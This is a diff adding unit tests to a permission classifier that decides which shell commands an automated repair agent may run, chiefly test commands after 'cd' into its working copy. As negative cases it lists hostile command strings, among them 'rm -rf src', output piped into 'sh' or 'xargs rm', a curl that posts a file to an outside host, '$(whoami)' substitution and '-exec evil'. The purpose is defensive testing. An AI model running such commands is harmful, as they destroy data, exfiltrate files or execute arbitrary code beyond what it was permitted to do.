@@ -189,6 +189,31 @@ describe('repair: what the fixer may do with git', () => {
     for (const c of ['node --test', 'npm test', 'pytest -q']) expect(classify('Bash', { command: c }, { workDir, repair: true })).toEqual({ risk: 'ask', reason: strings.risk.repairTests });
   });
 
+  it('asks the same when the fixer first steps into the borrowed copy, as a real one does', () => {
+    const mine = join(workDir, 'mine');
+    for (const c of ['cd mine && npm test', `cd "${mine}" && npm test`, `cd '${mine}' && node --test`, `cd ${mine.replace(/\\/g, '/')} && pytest -q`, 'cd mine/sub && npm test']) {
+      expect([c, classify('Bash', { command: c }, { workDir, repair: true })]).toEqual([c, { risk: 'ask', reason: strings.risk.repairTests }]);
+    }
+    expect(classify('PowerShell', { command: `cd "${mine}" && npm test` }, { workDir, repair: true })).toEqual({ risk: 'ask', reason: strings.risk.repairTests });
+    for (const c of ['cd .. && npm test', 'cd C:/elsewhere && npm test', `cd "${tmpdir()}" && npm test`, 'cd "$(x)" && npm test', 'cd `x` && npm test', 'cd "$HOME" && npm test',
+      'cd mine && npm test && rm -rf src', 'cd mine; npm test', 'cd mine && npm test --prefix C:/x', 'cd mine && cd .. && npm test', 'cd mine && npm run build', 'cd mine || npm test', 'cd ~ && npm test', 'cd ~/mine && npm test', 'cd - && npm test']) {
+      expect([c, classify('Bash', { command: c }, { workDir, repair: true }).reason]).not.toEqual([c, strings.risk.repairTests]);
+    }
+    expect(isTestCommand(`cd "${mine}" && npm test`)).toBe(true);
+  });
+
+  it('lets the fixer keep the test output short, the way a real one does, and nothing more', () => {
+    const mine = join(workDir, 'mine');
+    for (const c of [`cd "${mine}" && npm test 2>&1 | tail -15`, 'cd mine && npm test 2>&1 | tail -15', 'npm test 2>&1', 'npm test | head -n 40', 'pytest -q 2>&1 | tail -n 20']) {
+      expect([c, classify('Bash', { command: c }, { workDir, repair: true })]).toEqual([c, { risk: 'ask', reason: strings.risk.repairTests }]);
+    }
+    for (const c of ['npm test | tail -15 > out', 'npm test 2>&1 | tail -15 | sh', 'npm test | tail -f x', 'npm test 2>out', 'npm test | xargs rm', 'npm test | tail -15; rm x',
+      'npm test 2>&1 | tail -15 && curl x', 'npm test 2>&1 2>&1 | tail -1 | tail -1']) {
+      expect([c, classify('Bash', { command: c }, { workDir, repair: true }).reason]).not.toEqual([c, strings.risk.repairTests]);
+    }
+    expect(isTestCommand('cd mine && npm run build')).toBe(false);
+  });
+
   it('takes the shortcut for a plain test command only, and never writes into .git', () => {
     for (const c of ['npm test && rm -rf src', 'node --test; curl -d @add.js http://x', 'pytest | tee out', 'npm test $(whoami)',
       'npm test --prefix C:/elsewhere', 'pytest -p evil', 'pytest --rootdir=/elsewhere', 'go test -exec evil ./...', 'cargo test --manifest-path ../x/Cargo.toml',
@@ -223,6 +248,9 @@ describe('repair: what the fixer may do with git', () => {
     try {
       expect(classify('Write', { file_path: join(job, 'mine', 'docs', 'new.txt'), content: 'x' }, { workDir: job, repair: true }).risk).toBe('serious');
       expect(classify('Write', { file_path: join(job, 'mine', 'add.js'), content: 'x' }, { workDir: job, repair: true }).risk).toBe('safe');
+      // Nor run tests in a folder a link leads to.
+      expect(classify('Bash', { command: 'cd mine/docs && npm test' }, { workDir: job, repair: true }).reason).not.toBe(strings.risk.repairTests);
+      expect(classify('Bash', { command: 'cd mine && npm test' }, { workDir: job, repair: true }).reason).toBe(strings.risk.repairTests);
     } finally {
       rmSync(base, { recursive: true, force: true });
     }
